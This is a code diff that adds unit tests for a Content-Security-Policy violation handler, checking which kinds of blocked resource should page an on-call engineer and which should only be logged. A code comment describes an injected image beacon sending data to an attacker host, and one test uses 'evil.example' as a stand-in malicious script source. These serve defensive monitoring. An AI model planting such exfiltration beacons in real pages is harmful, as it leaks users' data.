@@ -381,3 +381,68 @@ describe("cspViolationPage (#2575)", () => {
     expect(on("not a url")).toMatchObject({ surface: "other" });
   });
 });
+
+describe("the injected passive third-party class (#3417)", () => {
+  // A FONT refused from a third-party host no Slate page requests, with no named source,
+  // is almost always an extension and blocked nothing a lead needed, so it is logged and
+  // does NOT page. Only font-src is suppressed: a named script, a Slate-own-origin refusal,
+  // an ACTIVE directive (script/connect/frame), and the other passive exfil channels
+  // (img/style/media) all still page at once.
+  const report = (over: Record<string, unknown> = {}) => ({
+    "csp-report": {
+      "document-uri": "https://slate.trypennie.app/book?xbc=411",
+      "violated-directive": "font-src",
+      "blocked-uri": "https://fonts.gstatic.com/s/mulish/x.woff2",
+      disposition: "enforce",
+      ...over,
+    },
+  });
+
+  it("logs, rather than pages, a passive third-party refusal with no source", async () => {
+    const { cspViolationPage } = await import("./csp");
+    expect(cspViolationPage(summariseViolation(report()))).toEqual({ page: false, why: "injected-passive" });
+  });
+
+  it("does NOT log-only img-src, style-src or media-src: they are data-exfil channels and keep paging", async () => {
+    // An injected `<img src=attacker/?d=...>` beacon or a CSS exfil is refused on these,
+    // so a third-party refusal there may signal an injection attempt worth a page. Only
+    // font-src is suppressed.
+    const { cspViolationPage } = await import("./csp");
+    for (const directive of ["img-src", "style-src", "media-src"]) {
+      const d = cspViolationPage(summariseViolation(report({ "violated-directive": directive })));
+      expect(d.page).toBe(true);
+    }
+  });
+
+  it("still pages an ACTIVE directive's third-party refusal at once (a blocked script is worth a page)", async () => {
+    const { cspViolationPage } = await import("./csp");
+    for (const directive of ["script-src", "connect-src", "frame-src"]) {
+      const d = cspViolationPage(summariseViolation(report({ "violated-directive": directive, "blocked-uri": "https://evil.example/x" })));
+      expect(d.page).toBe(true);
+    }
+  });
+
+  it("still pages a passive refusal that NAMES a script source (our own code)", async () => {
+    const { cspViolationPage } = await import("./csp");
+    const d = cspViolationPage(summariseViolation(report({ "source-file": "https://slate.trypennie.app/app.js" })));
+    expect(d.page).toBe(true);
+  });
+
+  it("still pages a passive refusal of Slate's OWN origin (a real gap in our loading)", async () => {
+    const { cspViolationPage } = await import("./csp");
+    const d = cspViolationPage(summariseViolation(report({ "blocked-uri": "https://slate.trypennie.app/fonts/own.woff2" })));
+    expect(d.page).toBe(true);
+  });
+
+  it("still pages a passive refusal whose blocked value is not a concrete origin (data:, a keyword)", async () => {
+    const { cspViolationPage } = await import("./csp");
+    expect(cspViolationPage(summariseViolation(report({ "blocked-uri": "data" }))).page).toBe(true);
+    expect(cspViolationPage(summariseViolation(report({ "blocked-uri": "inline" }))).page).toBe(true);
+  });
+
+  it("pages (never suppresses) when the document host cannot be read, so third-party cannot be proven", async () => {
+    const { cspViolationPage } = await import("./csp");
+    const d = cspViolationPage(summariseViolation(report({ "document-uri": "not a url" })));
+    expect(d.page).toBe(true);
+  });
+});
